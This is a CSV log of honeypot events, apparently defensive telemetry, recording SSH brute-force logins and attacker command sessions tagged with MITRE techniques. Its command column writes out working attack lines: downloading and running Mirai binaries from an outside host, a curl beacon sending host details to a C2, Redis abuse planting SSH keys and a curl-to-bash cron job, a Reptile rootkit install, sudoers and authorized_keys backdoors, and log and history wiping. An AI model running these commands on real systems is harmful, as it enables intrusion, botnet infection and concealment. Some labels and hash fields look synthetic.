event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-000760,5B4AA55B,2025-03-25T04:09:08Z,login_attempt,hp-us-01,162.243.143.105,37644,10.0.2.10,22,ssh,test,test123,True,,0,US,AS14061,DigitalOcean,Botnet/DDoS,T1110,Brute Force,high,,,,40,487,760,compromised_login,False,,74c3b1d5-08f9-4a10-bd20-b3053a01dd83,
EVT-000762,5B4AA55B,2025-03-25T04:09:24Z,command_executed,hp-us-01,162.243.143.105,44762,10.0.2.10,22,ssh,test,test123,True,arch,2,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,40,319,205,botnet_ddos,False,,8dfc0c9a-9589-4a62-a91f-1bd5c40203cf,
EVT-000763,5B4AA55B,2025-03-25T04:09:38Z,command_executed,hp-us-01,162.243.143.105,34485,10.0.2.10,22,ssh,test,test123,True,cat /proc/version,3,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,40,246,418,botnet_ddos,False,,247f1c50-99c9-4718-a16e-8ef4051b5067,
EVT-000761,5B4AA55B,2025-03-25T04:09:50Z,command_executed,hp-us-01,162.243.143.105,44677,10.0.2.10,22,ssh,test,test123,True,uname -a,1,US,AS14061,DigitalOcean,Botnet/DDoS,T1082,System Information Discovery,low,,,,40,182,348,botnet_ddos,True,,6854c384-b9c4-4d38-8a2d-490750fdb3ef,
EVT-000768,5B4AA55B,2025-03-25T04:11:00Z,command_executed,hp-us-01,162.243.143.105,58736,10.0.2.10,22,ssh,test,test123,True,wget -q http://194.165.16.11/bins/mirai.mips -O /tmp/mirai && chmod 777 /tmp/mirai,8,US,AS14061,DigitalOcean,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,6c79fd4934a74ae493af08de8942c761,40,82,387,botnet_ddos,False,,56714b59-8540-436c-8d95-ec920c6c52ea,
EVT-000764,5B4AA55B,2025-03-25T04:11:24Z,command_executed,hp-us-01,162.243.143.105,53335,10.0.2.10,22,ssh,test,test123,True,ls /tmp /var/tmp /dev/shm 2>/dev/null,4,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,40,194,358,botnet_ddos,False,,4d8a801f-cf84-4915-b6a7-dbf5e6d10e14,
EVT-000773,5B4AA55B,2025-03-25T04:11:57Z,command_executed,hp-us-01,162.243.143.105,45670,10.0.2.10,22,ssh,test,test123,True,echo '*/5 * * * * /tmp/mirai' | crontab -,13,US,AS14061,DigitalOcean,Botnet/DDoS,T1053.003,Scheduled Task: Cron,low,,,,40,104,308,botnet_ddos,False,,e4415b19-afb4-4694-83fd-5ee282c29e88,
EVT-000766,5B4AA55B,2025-03-25T04:12:02Z,command_executed,hp-us-01,162.243.143.105,39356,10.0.2.10,22,ssh,test,test123,True,wget -q http://194.165.16.11/bins/mirai.arm -O /tmp/mirai && chmod 777 /tmp/mirai,6,US,AS14061,DigitalOcean,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,0713289efebd487680b40df0c1b8e0e7,40,362,200,botnet_ddos,False,,e58cf0bd-a025-4730-9523-851a1ecccc2f,
EVT-000765,5B4AA55B,2025-03-25T04:12:13Z,command_executed,hp-us-01,162.243.143.105,57332,10.0.2.10,22,ssh,test,test123,True,df -h / | tail -1 | awk '{print $4}',5,US,AS14061,DigitalOcean,Botnet/DDoS,T1082,System Information Discovery,low,,,,40,325,316,botnet_ddos,False,,94c30d4d-dc47-4e11-b449-7c88d33994a7,
EVT-000767,5B4AA55B,2025-03-25T04:12:24Z,command_executed,hp-us-01,162.243.143.105,57987,10.0.2.10,22,ssh,test,test123,True,wget -q http://194.165.16.11/bins/mirai.x86 -O /tmp/mirai && chmod 777 /tmp/mirai,7,US,AS14061,DigitalOcean,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,d31e19ce81854e8d9988220ad00ca67b,40,303,131,botnet_ddos,True,,1096f85a-ed7e-4b41-87e7-9251abaeaf44,
EVT-000769,5B4AA55B,2025-03-25T04:14:50Z,command_executed,hp-us-01,162.243.143.105,35874,10.0.2.10,22,ssh,test,test123,True,cd /tmp && /tmp/mirai &,9,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,40,84,199,botnet_ddos,False,,7238bf53-6ff6-4966-a4ed-49303bd1605e,
EVT-000771,5B4AA55B,2025-03-25T04:15:44Z,command_executed,hp-us-01,162.243.143.105,55532,10.0.2.10,22,ssh,test,test123,True,iptables -A OUTPUT -j ACCEPT,11,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,40,190,432,botnet_ddos,False,,596b0cff-08a7-4222-9364-ae7d34adc1cd,
EVT-000770,5B4AA55B,2025-03-25T04:16:18Z,command_executed,hp-us-01,162.243.143.105,50711,10.0.2.10,22,ssh,test,test123,True,iptables -A INPUT -j ACCEPT,10,US,AS14061,DigitalOcean,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,40,394,107,botnet_ddos,False,,6b2b14e4-ac5c-4435-a13e-3a8eaa221a6b,
EVT-000776,5B4AA55B,2025-03-25T04:16:20Z,command_executed,hp-us-01,162.243.143.105,44660,10.0.2.10,22,ssh,test,test123,True,history -c,16,US,AS14061,DigitalOcean,Botnet/DDoS,T1070.003,Clear Command History,low,,,,40,154,292,botnet_ddos,False,,15038218-c9c2-42e8-b83f-4ff3c97c9200,
EVT-000772,5B4AA55B,2025-03-25T04:16:44Z,command_executed,hp-us-01,162.243.143.105,51298,10.0.2.10,22,ssh,test,test123,True,iptables -F,12,US,AS14061,DigitalOcean,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,40,298,216,botnet_ddos,False,,711cce76-d6d9-41e1-9e91-ba39b30c3ef6,
EVT-000775,5B4AA55B,2025-03-25T04:18:23Z,command_executed,hp-us-01,162.243.143.105,47542,10.0.2.10,22,ssh,test,test123,True,rm -f /tmp/mirai.arm /tmp/mirai.x86 /tmp/mirai.mips,15,US,AS14061,DigitalOcean,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,40,423,363,botnet_ddos,False,,cc686105-1326-41b3-acbf-7820b85f1db6,
EVT-000774,5B4AA55B,2025-03-25T04:19:10Z,command_executed,hp-us-01,162.243.143.105,55874,10.0.2.10,22,ssh,test,test123,True,curl -sk http://194.165.16.11/report?h=$(hostname -s)&ip=$(curl -s ifconfig.me 2>/dev/null)&arch=$(arch),14,US,AS14061,DigitalOcean,Botnet/DDoS,T1082,System Information Discovery,medium,yes,194.165.16.11,b41955e7645a47099238aed2ab64e801,40,452,355,botnet_ddos,False,,6263b143-792c-40a3-93ef-7e29cc00e5cd,
EVT-003638,4646FC36,2025-03-25T05:51:43Z,login_attempt,hp-br-01,45.142.212.100,58700,10.0.4.10,2222,ssh,test,Cisco123,False,,0,RU,AS197695,Reg.ru,Network Reconnaissance,T1110,Brute Force,medium,,,,389,708,1968,brute_force,False,,,
EVT-000737,3FA1C8F6,2025-03-25T11:35:24Z,login_attempt,hp-eu-01,198.199.119.50,36217,10.0.1.10,22,ssh,deploy,123456789,False,,0,US,AS14061,DigitalOcean,Credential Dumping,T1110,Brute Force,medium,,,,361,745,1248,brute_force,False,,,
EVT-002636,0B01076F,2025-03-25T17:32:48Z,login_attempt,hp-us-01,222.187.232.205,50510,10.0.2.10,22,ssh,ftpuser,vizxv,False,,0,CN,AS4134,ChinaNet,Redis Exploitation,T1110,Brute Force,medium,,,,415,588,579,brute_force,False,,,
EVT-001735,FA6D1E4B,2025-03-25T21:36:18Z,login_attempt,hp-br-01,179.60.147.31,49898,10.0.4.10,22,ssh,chef,Passw0rd!,True,,0,BR,AS262867,Hostinger BR,Botnet/DDoS,T1110,Brute Force,high,,,,473,363,532,compromised_login,False,,7cba39e0-34ba-47b3-a15a-f79190c174ae,
EVT-001736,FA6D1E4B,2025-03-25T21:36:48Z,command_executed,hp-br-01,179.60.147.31,42966,10.0.4.10,22,ssh,chef,Passw0rd!,True,uname -a,1,BR,AS262867,Hostinger BR,Botnet/DDoS,T1082,System Information Discovery,low,,,,473,536,99,botnet_ddos,False,,d7d0497a-9e21-4f48-b5d1-d198293283f1,
EVT-001737,FA6D1E4B,2025-03-25T21:37:08Z,command_executed,hp-br-01,179.60.147.31,45869,10.0.4.10,22,ssh,chef,Passw0rd!,True,arch,2,BR,AS262867,Hostinger BR,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,473,503,59,botnet_ddos,False,,fadd9aa0-4acc-49c7-afef-04b52c704443,
EVT-001740,FA6D1E4B,2025-03-25T21:37:13Z,command_executed,hp-br-01,179.60.147.31,42989,10.0.4.10,22,ssh,chef,Passw0rd!,True,df -h / | tail -1 | awk '{print $4}',5,BR,AS262867,Hostinger BR,Botnet/DDoS,T1082,System Information Discovery,low,,,,473,166,230,botnet_ddos,True,,ceaeb97a-da96-42fb-bc68-3cfb3f3bb685,
EVT-001742,FA6D1E4B,2025-03-25T21:37:21Z,command_executed,hp-br-01,179.60.147.31,52193,10.0.4.10,22,ssh,chef,Passw0rd!,True,wget -q http://194.165.16.11/bins/mirai.x86 -O /tmp/mirai && chmod 777 /tmp/mirai,7,BR,AS262867,Hostinger BR,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,5e41d18ab0fd47359ba9c8cbe5c67802,473,583,223,botnet_ddos,True,,466f515d-1d79-4c14-ab02-56fd584880f5,
EVT-001738,FA6D1E4B,2025-03-25T21:37:30Z,command_executed,hp-br-01,179.60.147.31,41315,10.0.4.10,22,ssh,chef,Passw0rd!,True,cat /proc/version,3,BR,AS262867,Hostinger BR,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,473,198,120,botnet_ddos,False,,040580d8-6f14-45b3-b4d5-ebef855aba88,
EVT-001750,FA6D1E4B,2025-03-25T21:38:18Z,command_executed,hp-br-01,179.60.147.31,34147,10.0.4.10,22,ssh,chef,Passw0rd!,True,rm -f /tmp/mirai.arm /tmp/mirai.x86 /tmp/mirai.mips,15,BR,AS262867,Hostinger BR,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,473,441,135,botnet_ddos,False,,949b04dd-8be7-4a72-b728-abd86ea77054,
EVT-001739,FA6D1E4B,2025-03-25T21:38:30Z,command_executed,hp-br-01,179.60.147.31,35189,10.0.4.10,22,ssh,chef,Passw0rd!,True,ls /tmp /var/tmp /dev/shm 2>/dev/null,4,BR,AS262867,Hostinger BR,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,473,446,320,botnet_ddos,False,,92580d67-3130-4c52-a9c9-db7f6b497e3d,
EVT-001747,FA6D1E4B,2025-03-25T21:39:06Z,command_executed,hp-br-01,179.60.147.31,36602,10.0.4.10,22,ssh,chef,Passw0rd!,True,iptables -F,12,BR,AS262867,Hostinger BR,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,473,114,370,botnet_ddos,False,,b3ad71cf-8c71-442b-a934-1fcfad545c6f,
EVT-001741,FA6D1E4B,2025-03-25T21:39:12Z,command_executed,hp-br-01,179.60.147.31,51254,10.0.4.10,22,ssh,chef,Passw0rd!,True,wget -q http://194.165.16.11/bins/mirai.arm -O /tmp/mirai && chmod 777 /tmp/mirai,6,BR,AS262867,Hostinger BR,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,fe05c536fae14151a3b1547465cd4d67,473,154,280,botnet_ddos,False,,9eb6739b-4481-467d-a98f-5e427ab4fd8f,
EVT-001745,FA6D1E4B,2025-03-25T21:40:08Z,command_executed,hp-br-01,179.60.147.31,50352,10.0.4.10,22,ssh,chef,Passw0rd!,True,iptables -A INPUT -j ACCEPT,10,BR,AS262867,Hostinger BR,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,473,200,153,botnet_ddos,False,,c491b7ee-5d94-4ed3-a2d0-7db69eeabe6e,
EVT-001749,FA6D1E4B,2025-03-25T21:40:44Z,command_executed,hp-br-01,179.60.147.31,45194,10.0.4.10,22,ssh,chef,Passw0rd!,True,curl -sk http://194.165.16.11/report?h=$(hostname -s)&ip=$(curl -s ifconfig.me 2>/dev/null)&arch=$(arch),14,BR,AS262867,Hostinger BR,Botnet/DDoS,T1082,System Information Discovery,medium,yes,194.165.16.11,100daad60f4a46468c2bbe90b51b2d01,473,89,411,botnet_ddos,False,,6f9799e4-d370-4f21-ace4-59ca933b29c2,
EVT-001743,FA6D1E4B,2025-03-25T21:41:54Z,command_executed,hp-br-01,179.60.147.31,43854,10.0.4.10,22,ssh,chef,Passw0rd!,True,wget -q http://194.165.16.11/bins/mirai.mips -O /tmp/mirai && chmod 777 /tmp/mirai,8,BR,AS262867,Hostinger BR,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,242cfa705beb4ddb8330cc0c2f85f6c5,473,585,440,botnet_ddos,False,,ba07a48d-5a94-4523-858a-e934399110e5,
EVT-001751,FA6D1E4B,2025-03-25T21:41:54Z,command_executed,hp-br-01,179.60.147.31,47951,10.0.4.10,22,ssh,chef,Passw0rd!,True,history -c,16,BR,AS262867,Hostinger BR,Botnet/DDoS,T1070.003,Clear Command History,low,,,,473,410,433,botnet_ddos,False,,b54e9510-6d26-45c1-8dd3-6ef35f18c934,
EVT-001744,FA6D1E4B,2025-03-25T21:42:18Z,command_executed,hp-br-01,179.60.147.31,52150,10.0.4.10,22,ssh,chef,Passw0rd!,True,cd /tmp && /tmp/mirai &,9,BR,AS262867,Hostinger BR,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,473,537,312,botnet_ddos,False,,d80ef0a0-d393-4c03-92e2-9fe058ff7b78,
EVT-001748,FA6D1E4B,2025-03-25T21:42:22Z,command_executed,hp-br-01,179.60.147.31,32951,10.0.4.10,22,ssh,chef,Passw0rd!,True,echo '*/5 * * * * /tmp/mirai' | crontab -,13,BR,AS262867,Hostinger BR,Botnet/DDoS,T1053.003,Scheduled Task: Cron,low,,,,473,220,433,botnet_ddos,False,,42b29244-f856-4a41-aeca-8332978b80c0,
EVT-001746,FA6D1E4B,2025-03-25T21:44:00Z,command_executed,hp-br-01,179.60.147.31,51205,10.0.4.10,22,ssh,chef,Passw0rd!,True,iptables -A OUTPUT -j ACCEPT,11,BR,AS262867,Hostinger BR,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,473,504,194,botnet_ddos,False,,12eba480-ddac-4222-a12f-a8af351069ae,
EVT-000410,F5CB29D4,2025-03-26T07:03:17Z,login_attempt,hp-ap-01,194.165.16.11,43074,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,,0,IR,AS206804,Tehran IXP,Redis Exploitation,T1110,Brute Force,high,,,,6,403,476,compromised_login,False,,27200db9-0187-4013-8421-5b62d4a79929,
EVT-000412,F5CB29D4,2025-03-26T07:03:37Z,command_executed,hp-ap-01,194.165.16.11,49103,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 info server | head -20,2,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,267,324,redis_exploitation,False,,97e7604e-0d66-46d6-adc5-3c45193f2195,
EVT-000411,F5CB29D4,2025-03-26T07:03:38Z,command_executed,hp-ap-01,194.165.16.11,38583,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 ping,1,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,587,343,redis_exploitation,False,,4acbed48-0fdd-4fab-9b2c-c507477ba778,
EVT-000414,F5CB29D4,2025-03-26T07:03:49Z,command_executed,hp-ap-01,194.165.16.11,48973,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 keys '*' | head -20,4,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,158,115,redis_exploitation,False,,0ee93f08-c74d-434f-bfc2-89818f6f5b7e,
EVT-000413,F5CB29D4,2025-03-26T07:04:38Z,command_executed,hp-ap-01,194.165.16.11,45960,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 info keyspace,3,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,168,133,redis_exploitation,False,,fc876d64-3448-4dda-902a-6a9d41305071,
EVT-000415,F5CB29D4,2025-03-26T07:04:52Z,command_executed,hp-ap-01,194.165.16.11,50024,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 config get dir,5,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,369,401,redis_exploitation,False,,6cfb76ec-8852-455a-8a77-3f3508fc3bc9,
EVT-000419,F5CB29D4,2025-03-26T07:05:50Z,command_executed,hp-ap-01,194.165.16.11,44340,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,"redis-cli -h 127.0.0.1 -p 6379 SET sshpayload ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vKj9 attacker@c2\n\n""",9,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,385,479,redis_exploitation,False,,598b7d67-67f1-48d0-8682-c268ed22555f,
EVT-000417,F5CB29D4,2025-03-26T07:06:47Z,command_executed,hp-ap-01,194.165.16.11,39324,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dir /root/.ssh,7,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,184,114,redis_exploitation,False,,5ca566dc-6930-4f05-966d-fffcc0d568d4,
EVT-000416,F5CB29D4,2025-03-26T07:06:59Z,command_executed,hp-ap-01,194.165.16.11,58606,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 config get dbfilename,6,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,507,262,redis_exploitation,False,,496b603b-1b51-4ced-9d21-626572621292,
EVT-000424,F5CB29D4,2025-03-26T07:07:01Z,command_executed,hp-ap-01,194.165.16.11,47810,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 BGSAVE,14,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,496,392,redis_exploitation,False,,0a7e07d1-98c2-49e6-b2a5-289247f25cc0,
EVT-000422,F5CB29D4,2025-03-26T07:07:17Z,command_executed,hp-ap-01,194.165.16.11,40918,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dbfilename root,12,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,195,245,redis_exploitation,False,,53e47c62-8367-4e11-8853-da559bc582a4,
EVT-000425,F5CB29D4,2025-03-26T07:08:02Z,command_executed,hp-ap-01,194.165.16.11,53561,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 DEBUG SLEEP 0,15,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,116,326,redis_exploitation,False,,c972642a-5cc0-45da-923d-6b2d932d4380,
EVT-000418,F5CB29D4,2025-03-26T07:08:05Z,command_executed,hp-ap-01,194.165.16.11,51374,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dbfilename authorized_keys,8,IR,AS206804,Tehran IXP,Redis Exploitation,T1098.004,SSH Authorized Keys,high,,,,6,195,152,redis_exploitation,False,,6398990b-2d53-473b-aa5c-893e53bf3b7b,
EVT-000421,F5CB29D4,2025-03-26T07:09:53Z,command_executed,hp-ap-01,194.165.16.11,48586,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 CONFIG SET dir /var/spool/cron/crontabs,11,IR,AS206804,Tehran IXP,Redis Exploitation,T1053.003,Scheduled Task: Cron,low,,,,6,558,203,redis_exploitation,True,,7aa6db5a-56c0-44a6-917f-8538b0fe4c83,
EVT-000420,F5CB29D4,2025-03-26T07:10:37Z,command_executed,hp-ap-01,194.165.16.11,56343,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,redis-cli -h 127.0.0.1 -p 6379 BGSAVE,10,IR,AS206804,Tehran IXP,Redis Exploitation,T1505.003,Web Shell,low,,,,6,255,189,redis_exploitation,False,,0f0f162c-f0fb-46ed-a866-7976d27880a2,
EVT-000423,F5CB29D4,2025-03-26T07:12:36Z,command_executed,hp-ap-01,194.165.16.11,54801,10.0.3.10,2222,ssh,sysadmin,Spring2024!,True,"redis-cli -h 127.0.0.1 -p 6379 SET crontask ""\n*/1 * * * * curl -fsSL http://91.92.251.103/sh | bash\n""",13,IR,AS206804,Tehran IXP,Redis Exploitation,T1105,Ingress Tool Transfer,medium,yes,91.92.251.103,35f5204011d24e13a47fd29e833e0225,6,244,238,redis_exploitation,False,,3150af98-c9c5-4412-a6a9-4484a9933a4a,
EVT-001214,EB762162,2025-03-26T08:24:15Z,login_attempt,hp-br-01,5.188.206.26,48316,10.0.4.10,22,ssh,mysql,openwrt,True,,0,RU,AS50673,Serverius,Rootkit/Persistence,T1110,Brute Force,high,,,,140,238,550,compromised_login,False,,8a097fd7-cdd2-4171-808d-e942f60ffcb4,
EVT-001217,EB762162,2025-03-26T08:24:45Z,command_executed,hp-br-01,5.188.206.26,36589,10.0.4.10,22,ssh,mysql,openwrt,True,dmesg | tail -10,3,RU,AS50673,Serverius,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,140,238,389,rootkit_persistence,False,,7feb669e-0fec-46f8-b47f-8ba6a2d6d200,
EVT-001225,EB762162,2025-03-26T08:24:48Z,command_executed,hp-br-01,5.188.206.26,43888,10.0.4.10,22,ssh,mysql,openwrt,True,echo 'svc_monitor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,11,RU,AS50673,Serverius,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,140,480,404,rootkit_persistence,False,,4a040cb7-fc4e-4fac-9425-99a4f8e5d6b8,
EVT-001215,EB762162,2025-03-26T08:24:52Z,command_executed,hp-br-01,5.188.206.26,50332,10.0.4.10,22,ssh,mysql,openwrt,True,uname -a && uname -r,1,RU,AS50673,Serverius,Rootkit/Persistence,T1082,System Information Discovery,low,,,,140,202,377,rootkit_persistence,False,,995211a9-f37f-48e5-ba2a-91666958d1a3,
EVT-001216,EB762162,2025-03-26T08:24:55Z,command_executed,hp-br-01,5.188.206.26,55201,10.0.4.10,22,ssh,mysql,openwrt,True,lsmod | head -20,2,RU,AS50673,Serverius,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,140,357,119,rootkit_persistence,False,,ba1d4382-768b-4fca-87c5-1800f7e57096,
EVT-001220,EB762162,2025-03-26T08:24:57Z,command_executed,hp-br-01,5.188.206.26,52810,10.0.4.10,22,ssh,mysql,openwrt,True,cd /tmp && curl -O http://91.92.251.103/rootkit/reptile.tar.gz,6,RU,AS50673,Serverius,Rootkit/Persistence,T1105,Ingress Tool Transfer,medium,yes,91.92.251.103,9268703e11a04fa88c7097b469079a27,140,461,263,rootkit_persistence,False,,da830f64-1087-4b76-860c-26bea51081b0,
EVT-001218,EB762162,2025-03-26T08:25:39Z,command_executed,hp-br-01,5.188.206.26,35516,10.0.4.10,22,ssh,mysql,openwrt,True,setenforce 0 2>/dev/null; systemctl stop apparmor 2>/dev/null,4,RU,AS50673,Serverius,Rootkit/Persistence,T1562.001,Disable Security Tools,low,,,,140,536,359,rootkit_persistence,False,,1bdec6ee-d746-43e3-a016-daf043fc51be,
EVT-001227,EB762162,2025-03-26T08:25:46Z,command_executed,hp-br-01,5.188.206.26,35087,10.0.4.10,22,ssh,mysql,openwrt,True,echo 'svc_monitor:Tr0ub4dor&3' | chpasswd,13,RU,AS50673,Serverius,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,140,480,106,rootkit_persistence,False,,15b6cc74-afa6-4a2e-afc0-d567a3058b70,
EVT-001221,EB762162,2025-03-26T08:26:21Z,command_executed,hp-br-01,5.188.206.26,33506,10.0.4.10,22,ssh,mysql,openwrt,True,tar xzf reptile.tar.gz && cd reptile && make install 2>/dev/null,7,RU,AS50673,Serverius,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,140,127,307,rootkit_persistence,False,,2d375823-ec16-4b7c-94a8-72d2fdad3179,
EVT-001226,EB762162,2025-03-26T08:26:27Z,command_executed,hp-br-01,5.188.206.26,53316,10.0.4.10,22,ssh,mysql,openwrt,True,"useradd -m -s /bin/bash -G sudo,root svc_monitor 2>/dev/null",12,RU,AS50673,Serverius,Rootkit/Persistence,T1059.004,Unix Shell,low,,,,140,596,333,rootkit_persistence,False,,775df666-4023-42f8-a10b-133ded83b318,
EVT-001219,EB762162,2025-03-26T08:26:55Z,command_executed,hp-br-01,5.188.206.26,51849,10.0.4.10,22,ssh,mysql,openwrt,True,apt-get update -qq && apt-get install -y -qq gcc make libssl-dev 2>/dev/null,5,RU,AS50673,Serverius,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,140,423,369,rootkit_persistence,False,,055ba973-dc23-4986-868f-76555d13405f,
EVT-001222,EB762162,2025-03-26T08:27:51Z,command_executed,hp-br-01,5.188.206.26,52765,10.0.4.10,22,ssh,mysql,openwrt,True,insmod /lib/modules/$(uname -r)/extra/reptile.ko 2>/dev/null,8,RU,AS50673,Serverius,Rootkit/Persistence,T1082,System Information Discovery,low,,,,140,189,399,rootkit_persistence,False,,61288ab0-0275-406c-b7a1-01a708e76e0b,
EVT-001223,EB762162,2025-03-26T08:29:57Z,command_executed,hp-br-01,5.188.206.26,52337,10.0.4.10,22,ssh,mysql,openwrt,True,echo '/lib/modules/$(uname -r)/extra/reptile.ko' >> /etc/modules,9,RU,AS50673,Serverius,Rootkit/Persistence,T1082,System Information Discovery,low,,,,140,462,230,rootkit_persistence,False,,ef13392b-0836-468d-bf40-f1bc32a70127,
EVT-001224,EB762162,2025-03-26T08:31:05Z,command_executed,hp-br-01,5.188.206.26,48252,10.0.4.10,22,ssh,mysql,openwrt,True,sed -i '/reptile/d' /var/log/syslog /var/log/kern.log 2>/dev/null,10,RU,AS50673,Serverius,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,140,142,139,rootkit_persistence,False,,4b6a36ec-f5d9-4bcd-b01f-ad4fa46c44a7,
EVT-001228,EB762162,2025-03-26T08:32:53Z,command_executed,hp-br-01,5.188.206.26,49509,10.0.4.10,22,ssh,mysql,openwrt,True,mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... backdoor@ops' >> /root/.ssh/authorized_keys,14,RU,AS50673,Serverius,Rootkit/Persistence,T1098.004,SSH Authorized Keys,high,,,,140,122,425,rootkit_persistence,False,,706a212b-3f43-4495-8be3-fb3c17c674fc,
